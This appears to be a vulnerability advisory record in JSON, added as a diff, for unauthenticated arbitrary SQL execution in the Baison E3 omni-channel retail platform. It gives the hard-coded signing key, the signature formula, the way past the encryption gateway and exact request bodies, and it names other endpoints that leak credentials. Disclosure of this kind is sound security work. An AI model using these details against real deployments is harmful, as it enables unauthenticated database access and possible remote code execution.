@@ -1,0 +1,167 @@
+{
+  "id": null,
+  "identifier": null,
+  "status": "submitted",
+  "title": "Baison E3 - ExecByControlName_Two Unauthenticated Arbitrary SQL Execution (leading to RCE)",
+  "classification": "SQL Injection",
+  "risk": "critical",
+
+  "vendor": "Baison Software",
+  "vendor_detail": "上海百胜软件股份有限公司",
+  "product": "E3 全渠道中台 (E3 Omni-channel Retail Platform)",
+  "component": "/e3api/api/KHATTACH/ExecByControlName_Two",
+  "version": "2.x",
+  "version_detail": "confirmed on buildTime 20260929 (productCode 1008) and a productCode 1011 deployment; reported affected range V2.3.0-T5 .. V2.5.1-T6 (boundaries not independently verified)",
+
+  "cwe": [
+    {
+      "id": "CWE-89",
+      "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+    },
+    {
+      "id": "CWE-306",
+      "name": "Missing Authentication for Critical Function"
+    },
+    {
+      "id": "CWE-798",
+      "name": "Use of Hard-coded Credentials"
+    }
+  ],
+
+  "cvss": [
+    {
+      "version": "3.1",
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 9.8,
+      "severity": "Critical",
+      "scenario": "Unauthenticated remote attacker; single HTTP request with an offline-computable signature"
+    }
+  ],
+
+  "attack_type": "Remote",
+  "impact": "SQL Execution",
+  "impact_note": "SQL execution confirmed with echo; on deployments running the database connection as sa with xp_cmdshell enabled (verified on one live deployment: value_in_use = 1), the same endpoint accepts EXEC batches, yielding remote code execution by configuration-state confirmation. Command execution was not exercised on third-party systems.",
+  "authentication_required": false,
+  "privilege_required": null,
+
+  "affected": [
+    {
+      "vendor": "Baison Software",
+      "product": "E3 全渠道中台",
+      "version": "2.x (productCode 1008, buildTime 20260929)",
+      "status": "confirmed"
+    },
+    {
+      "vendor": "Baison Software",
+      "product": "E3 全渠道中台",
+      "version": "2.x (productCode 1011 deployment)",
+      "status": "confirmed"
+    },
+    {
+      "vendor": "Baison Software",
+      "product": "E3 全渠道中台",
+      "version": "V2.3.0-T5 .. V2.5.1-T6",
+      "status": "reported",
+      "note": "range reported during assessment; boundaries not independently verified"
+    }
+  ],
+  "fixed_version": null,
+
+  "description": "A vulnerability classified as critical has been found in Baison E3 全渠道中台. Affected by this issue is the ExecByControlName_Two endpoint of the KHATTACH controller. The endpoint reflectively invokes a backend method named by the client-supplied controleName and method fields without authentication and passes retObjs[0], an arbitrary attacker-controlled string, directly to the backend SQL Server as a T-SQL batch; EXEC statements are accepted. The request signature md5(timestamp + AccessToken + UserID + wcfService + dataJson + SIGN_KEY) relies on a key (5feb28f6a28613ace02fe261c6b6c294) hard-coded in the public frontend JavaScript bundle and shared across deployments, with AccessToken and UserID accepted empty, so signatures can be forged offline. Requests without an En-Status header bypass the AES request-body gateway entirely. The database connection runs as sa (sysadmin confirmed); on one verified deployment xp_cmdshell is enabled (value_in_use = 1), making unauthenticated remote code execution reachable. The same product also exposes an unauthenticated SQL-injection endpoint (POST /e3api/api/main/getCacheDataFromDB, string-concatenated selectFields/tableName/where) and an unauthenticated full system-parameter disclosure endpoint (POST /e3api/api/SysInfo/SysParamInfo, including IAM_SECRET and PLAT_* platform credentials).",
+
+  "vulnerable_code": [
+    {
+      "file": "E3 e3api (frontend app.js)",
+      "lines": "n/a",
+      "action": "hard-coded signature key (CWE-798)",
+      "snippet": "SIGN_KEY = \"5feb28f6a28613ace02fe261c6b6c294\"\nSign = md5(timestamp + \"AccessTokenUserIDwcfService\" + dataJson + SIGN_KEY)"
+    },
+    {
+      "file": "E3 e3api KHATTACH controller",
+      "lines": "n/a",
+      "action": "POST /api/KHATTACH/ExecByControlName_Two",
+      "snippet": "controleName = \"mod_ComFunc\"\nmethod       = \"GetDataBySql_Two\"   (also \"GetDataBySql\")\nretObjs[0]   = <arbitrary T-SQL batch, executed by SQL Server and echoed back>"
+    },
+    {
+      "file": "E3 e3api AES request-body gateway",
+      "lines": "n/a",
+      "action": "envelope bypass",
+      "snippet": "requests carrying an En-Status header are decrypted; requests without the header are passed through as plaintext multipart with no access control"
+    }
+  ],
+
+  "attack_vector": "The attacker sends a single multipart POST to /e3api/api/KHATTACH/ExecByControlName_Two with empty AccessToken/UserID/wcfService fields, a self-chosen millisecond timestamp, a data JSON of {\"controleName\":\"mod_ComFunc\",\"method\":\"GetDataBySql_Two\",\"retObjs\":[\"<SQL>\"]}, and Sign computed offline with the publicly extractable hard-coded key. The En-Status header is simply omitted. retObjs[0] is executed by the backend SQL Server and the result is echoed in the HTTP response. No credentials of any kind are used.",
+
+  "proof_of_concept": {
+    "stage_1": {
+      "method": "POST",
+      "url": "/e3api/api/KHATTACH/ExecByControlName_Two",
+      "body": "data={\"controleName\":\"mod_ComFunc\",\"method\":\"GetDataBySql_Two\",\"retObjs\":[\"select 1 as e3probe\"]}",
+      "effect": "returns {\"A\":[{\"e3probe\":{\"Int32\":1},...}]} - anonymous SQL execution with echo"
+    },
+    "stage_2": {
+      "method": "POST (same endpoint)",
+      "url": "/e3api/api/KHATTACH/ExecByControlName_Two",
+      "body": "retObjs[0] = SELECT @@VERSION / SELECT SYSTEM_USER",
+      "effect": "Microsoft SQL Server 2019 ... / sa"
+    },
+    "scripts": [
+      "poc/exploit.py"
+    ]
+  },
+
+  "reproduction_environment": {
+    "stack": "Baison E3 全渠道中台 deployments (frontend + e3api + SQL Server 2019 on Windows Server 2019)",
+    "targets": "one vendor demo deployment and two independent live deployments (hostnames withheld); productCode 1008 / 1011",
+    "note": "verification limited to read-only statements; command execution confirmed by configuration state only"
+  },
+
+  "timeline": [
+    {
+      "date": "2026-10/11",
+      "event": "Vulnerability identified during an authorized assessment of a demo deployment and reproduced on two independent live deployments"
+    },
+    {
+      "date": "2026-11-03",
+      "event": "Advisory published publicly"
+    },
+    {
+      "date": null,
+      "event": "Vendor notification (pending)"
+    },
+    {
+      "date": null,
+      "event": "CVE ID requested / VulDB entry submitted"
+    }
+  ],
+
+  "references": [
+    {
+      "type": "advisory",
+      "url": "https://github.com/SDshadow/Baison-E3-unauth-SQLi/blob/main/README.md"
+    },
+    {
+      "type": "vendor",
+      "url": "https://www.baison.com.cn/"
+    },
+    {
+      "type": "related",
+      "identifier": "CNVD-2017-35839",
+      "note": "E3 V1.x SQL injection attributed to a weak signature algorithm and insufficient input filtering; same root-cause pattern, different trigger point and version line"
+    },
+    {
+      "type": "related",
+      "identifier": "CNVD-2020-75300 / CNVD-2026-11482",
+      "note": "earlier E3 product-line unauthorized access / information disclosure issues"
+    }
+  ],
+
+  "credits": [
+    {
+      "name": "SDshadow",
+      "role": "reporter"
+    }
+  ],
+
+  "disclosure_date": "2026-11-03"
+}
